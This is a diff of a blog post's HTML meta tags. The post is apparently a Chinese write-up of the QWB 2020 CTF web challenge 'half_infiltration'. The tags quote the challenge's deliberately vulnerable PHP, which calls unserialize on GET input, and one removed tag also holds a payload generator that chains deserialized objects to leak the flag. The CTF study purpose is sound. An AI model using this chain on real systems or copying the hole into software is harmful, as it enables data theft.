@@ -7,11 +7,53 @@
 <meta name="robots" content="index, follow">
 <title>qwb2020web复现 | ch3n9w の 超元域</title>
 <meta name="keywords" content="">
-<meta name="description" content="half_infiltration 开局的页面如下
-&lt;?php highlight_file(__FILE__); $flag=file_get_contents(&#39;ssrf.php&#39;); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-&gt;age; $boy = $this-&gt;sex; $a = $this-&gt;num; $student-&gt;$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS[&#39;flag&#39;]; ob_end_clean(); } } if (isset($_GET[&#39;x&#39;])) { unserialize($_GET[&#39;x&#39;])-&gt;get_it(); } 思路是进行两次反序列化, 第一次将$_GLOBALS[&lsquo;flag&rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲
-启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。
-ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.
-&lt;?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-&gt;age = $a; $this-&gt;sex = $b; $this-&gt;num = $c; } } echo urlencode(serialize([ new User(new Pass(), &#34;read&#34;, &#34;result&#34;), new User(new Pass(), &#34;read&#34;, &#34;this&#34;) ])); ?">
+<meta name="description" content="half_infiltration
+开局的页面如下
+&lt;?php
+highlight_file(__FILE__);
+
+$flag=file_get_contents(&#39;ssrf.php&#39;);
+
+class Pass
+{
+
+
+    function read()
+    {
+        ob_start();
+        global $result;
+        print $result;
+
+    }
+}
+
+class User
+{
+    public $age,$sex,$num;
+
+    function __destruct()
+    {
+        $student = $this-&gt;age;
+        $boy = $this-&gt;sex;
+        $a = $this-&gt;num;
+    $student-&gt;$boy();
+    if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student)))
+    {
+        ob_end_clean();
+        exit();
+    }
+    global $$a;
+    $result=$GLOBALS[&#39;flag&#39;];
+        ob_end_clean();
+    }
+}
+
+if (isset($_GET[&#39;x&#39;])) {
+    unserialize($_GET[&#39;x&#39;])-&gt;get_it();
+} 
+思路是进行两次反序列化, 第一次将$_GLOBALS[&lsquo;flag&rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲
+
+启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。">
 <meta name="author" content="ch3n9w">
 <link rel="canonical" href="https://ch3n9w.github.io/posts/ctf-qwb2020-web-1/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
@@ -59,15 +101,54 @@ ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到
         }
 
     </style>
-</noscript>
-  
+</noscript><meta property="og:title" content="qwb2020web复现" />
+<meta property="og:description" content="half_infiltration
+开局的页面如下
+&lt;?php
+highlight_file(__FILE__);
 
-<meta property="og:title" content="qwb2020web复现" />
-<meta property="og:description" content="half_infiltration 开局的页面如下
-&lt;?php highlight_file(__FILE__); $flag=file_get_contents(&#39;ssrf.php&#39;); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-&gt;age; $boy = $this-&gt;sex; $a = $this-&gt;num; $student-&gt;$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS[&#39;flag&#39;]; ob_end_clean(); } } if (isset($_GET[&#39;x&#39;])) { unserialize($_GET[&#39;x&#39;])-&gt;get_it(); } 思路是进行两次反序列化, 第一次将$_GLOBALS[&lsquo;flag&rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲
-启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。
-ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.
-&lt;?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-&gt;age = $a; $this-&gt;sex = $b; $this-&gt;num = $c; } } echo urlencode(serialize([ new User(new Pass(), &#34;read&#34;, &#34;result&#34;), new User(new Pass(), &#34;read&#34;, &#34;this&#34;) ])); ?" />
+$flag=file_get_contents(&#39;ssrf.php&#39;);
+
+class Pass
+{
+
+
+    function read()
+    {
+        ob_start();
+        global $result;
+        print $result;
+
+    }
+}
+
+class User
+{
+    public $age,$sex,$num;
+
+    function __destruct()
+    {
+        $student = $this-&gt;age;
+        $boy = $this-&gt;sex;
+        $a = $this-&gt;num;
+    $student-&gt;$boy();
+    if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student)))
+    {
+        ob_end_clean();
+        exit();
+    }
+    global $$a;
+    $result=$GLOBALS[&#39;flag&#39;];
+        ob_end_clean();
+    }
+}
+
+if (isset($_GET[&#39;x&#39;])) {
+    unserialize($_GET[&#39;x&#39;])-&gt;get_it();
+} 
+思路是进行两次反序列化, 第一次将$_GLOBALS[&lsquo;flag&rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲
+
+启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://ch3n9w.github.io/posts/ctf-qwb2020-web-1/" />
 <meta property="og:image" content="https://ch3n9w.github.io/image-20211114141959846.png" /><meta property="article:section" content="posts" />
@@ -77,11 +158,53 @@ ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到
 <meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:image" content="https://ch3n9w.github.io/image-20211114141959846.png" />
 <meta name="twitter:title" content="qwb2020web复现"/>
-<meta name="twitter:description" content="half_infiltration 开局的页面如下
-&lt;?php highlight_file(__FILE__); $flag=file_get_contents(&#39;ssrf.php&#39;); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-&gt;age; $boy = $this-&gt;sex; $a = $this-&gt;num; $student-&gt;$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS[&#39;flag&#39;]; ob_end_clean(); } } if (isset($_GET[&#39;x&#39;])) { unserialize($_GET[&#39;x&#39;])-&gt;get_it(); } 思路是进行两次反序列化, 第一次将$_GLOBALS[&lsquo;flag&rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲
-启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。
-ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.
-&lt;?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-&gt;age = $a; $this-&gt;sex = $b; $this-&gt;num = $c; } } echo urlencode(serialize([ new User(new Pass(), &#34;read&#34;, &#34;result&#34;), new User(new Pass(), &#34;read&#34;, &#34;this&#34;) ])); ?"/>
+<meta name="twitter:description" content="half_infiltration
+开局的页面如下
+&lt;?php
+highlight_file(__FILE__);
+
+$flag=file_get_contents(&#39;ssrf.php&#39;);
+
+class Pass
+{
+
+
+    function read()
+    {
+        ob_start();
+        global $result;
+        print $result;
+
+    }
+}
+
+class User
+{
+    public $age,$sex,$num;
+
+    function __destruct()
+    {
+        $student = $this-&gt;age;
+        $boy = $this-&gt;sex;
+        $a = $this-&gt;num;
+    $student-&gt;$boy();
+    if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student)))
+    {
+        ob_end_clean();
+        exit();
+    }
+    global $$a;
+    $result=$GLOBALS[&#39;flag&#39;];
+        ob_end_clean();
+    }
+}
+
+if (isset($_GET[&#39;x&#39;])) {
+    unserialize($_GET[&#39;x&#39;])-&gt;get_it();
+} 
+思路是进行两次反序列化, 第一次将$_GLOBALS[&lsquo;flag&rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲
+
+启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。"/>
 
 
 <script type="application/ld+json">
@@ -110,7 +233,7 @@ ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到
   "@type": "BlogPosting",
   "headline": "qwb2020web复现",
   "name": "qwb2020web复现",
-  "description": "half_infiltration 开局的页面如下\n\u0026lt;?php highlight_file(__FILE__); $flag=file_get_contents(\u0026#39;ssrf.php\u0026#39;); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-\u0026gt;age; $boy = $this-\u0026gt;sex; $a = $this-\u0026gt;num; $student-\u0026gt;$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS[\u0026#39;flag\u0026#39;]; ob_end_clean(); } } if (isset($_GET[\u0026#39;x\u0026#39;])) { unserialize($_GET[\u0026#39;x\u0026#39;])-\u0026gt;get_it(); } 思路是进行两次反序列化, 第一次将$_GLOBALS[\u0026lsquo;flag\u0026rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲\n启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。\nob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.\n\u0026lt;?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-\u0026gt;age = $a; $this-\u0026gt;sex = $b; $this-\u0026gt;num = $c; } } echo urlencode(serialize([ new User(new Pass(), \u0026#34;read\u0026#34;, \u0026#34;result\u0026#34;), new User(new Pass(), \u0026#34;read\u0026#34;, \u0026#34;this\u0026#34;) ])); ?",
+  "description": "half_infiltration 开局的页面如下\n\u0026lt;?php highlight_file(__FILE__); $flag=file_get_contents(\u0026#39;ssrf.php\u0026#39;); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-\u0026gt;age; $boy = $this-\u0026gt;sex; $a = $this-\u0026gt;num; $student-\u0026gt;$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS[\u0026#39;flag\u0026#39;]; ob_end_clean(); } } if (isset($_GET[\u0026#39;x\u0026#39;])) { unserialize($_GET[\u0026#39;x\u0026#39;])-\u0026gt;get_it(); } 思路是进行两次反序列化, 第一次将$_GLOBALS[\u0026lsquo;flag\u0026rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲\n启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。\n",
   "keywords": [
     
   ],
